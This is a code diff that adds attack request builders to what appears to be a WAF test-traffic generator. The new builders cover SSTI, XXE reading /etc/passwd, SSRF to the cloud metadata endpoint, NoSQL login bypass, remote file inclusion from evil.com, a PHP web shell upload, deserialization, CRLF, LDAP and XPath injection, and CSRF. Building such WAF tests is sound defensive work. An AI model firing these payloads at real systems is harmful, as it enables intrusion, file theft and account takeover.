@@ -60,12 +60,109 @@ def _build_jwt_forgery_request():
     return {"method": "GET", "path": "rest/user/whoami", "headers": {"Authorization": f"Bearer {token}"}}
 
 
+def _build_ssti_request():
+    payload = random.choice(["{{7*7}}", "{{ config }}", "${7*7}"])
+    return {"method": "POST", "path": "rest/user/change-profile", "json": {"nickname": payload}}
+
+
+def _build_xxe_request():
+    xml_payload = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        "<foo>&xxe;</foo>"
+    )
+    return {
+        "method": "POST",
+        "path": "rest/user/import",
+        "data": xml_payload,
+        "headers": {"Content-Type": "application/xml"},
+    }
+
+
+def _build_ssrf_request():
+    payload = random.choice(["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:6379/"])
+    return {"method": "POST", "path": "rest/user/avatar-from-url", "json": {"url": payload}}
+
+
+def _build_nosqli_request():
+    return {
+        "method": "POST",
+        "path": "rest/user/login",
+        "json": {"email": {"$ne": None}, "password": {"$ne": None}},
+    }
+
+
+def _build_rfi_request():
+    payload = random.choice(["http://evil.com/shell.txt", "php://filter/convert.base64-encode/resource=index.php"])
+    return {"method": "POST", "path": "rest/products/search", "json": {"page": payload}}
+
+
+def _build_file_upload_request():
+    return {
+        "method": "POST",
+        "path": "file-upload",
+        "files": {"file": ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")},
+    }
+
+
+def _build_insecure_deserialization_request():
+    payload = random.choice(['O:4:"User":2:{s:2:"id";i:1;s:5:"admin";b:1;}', "rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ=="])
+    return {"method": "POST", "path": "rest/user/session", "json": {"data": payload}}
+
+
+def _build_open_redirect_request():
+    payload = random.choice(["//evil.com/phish", "https://evil.com/phish"])
+    return {"method": "POST", "path": "rest/user/redirect", "json": {"redirect": payload}}
+
+
+def _build_crlf_injection_request():
+    return {"method": "POST", "path": "rest/language", "json": {"lang": "ko\r\nSet-Cookie: admin=true"}}
+
+
+def _build_ldap_injection_request():
+    return {"method": "POST", "path": "rest/user/search", "json": {"uid": "*)(uid=*))(|(uid=*"}}
+
+
+def _build_xpath_injection_request():
+    return {"method": "POST", "path": "rest/user/lookup", "json": {"username": "'] | //user | ['"}}
+
+
+def _build_csrf_request():
+    # Origin/Referer 없이 세션 쿠키만 실어서 상태변경 요청을 흉내낸다.
+    # 공격자 페이지의 <form> 자동 제출은 fetch/XHR이 아니라서 브라우저가 Origin을 안 붙이는
+    # 경우가 흔한데, requests 라이브러리도 명시적으로 안 넣는 한 마찬가지라 그대로 재현된다.
+    return {
+        "method": "POST",
+        "path": "rest/user/change-password",
+        "json": {"newPassword": "hacked1234"},
+        "headers": {"Cookie": f"session={fake.sha1()[:16]}"},
+    }
+
+
+def _build_hpp_request():
+    # engine.py가 아니라 proxy.py에서 별도로 잡는다 (같은 이름의 쿼리 파라미터가 중복으로 옴)
+    return {"method": "GET", "path": "rest/products/search", "params": [("q", "widget"), ("q", "' OR 1=1 --")]}
+
+
 WAF_REQUEST_BUILDERS = [
     _build_sqli_request,
     _build_xss_request,
     _build_path_traversal_request,
     _build_os_command_injection_request,
     _build_jwt_forgery_request,
+    _build_ssti_request,
+    _build_xxe_request,
+    _build_ssrf_request,
+    _build_nosqli_request,
+    _build_rfi_request,
+    _build_file_upload_request,
+    _build_insecure_deserialization_request,
+    _build_open_redirect_request,
+    _build_crlf_injection_request,
+    _build_ldap_injection_request,
+    _build_xpath_injection_request,
+    _build_csrf_request,
+    _build_hpp_request,
 ]
 
 
@@ -79,6 +176,8 @@ def send_waf_event():
             url=url,
             params=request_spec.get("params"),
             json=request_spec.get("json"),
+            data=request_spec.get("data"),
+            files=request_spec.get("files"),
             headers=request_spec.get("headers"),
             timeout=REQUEST_TIMEOUT_SECONDS,
         )
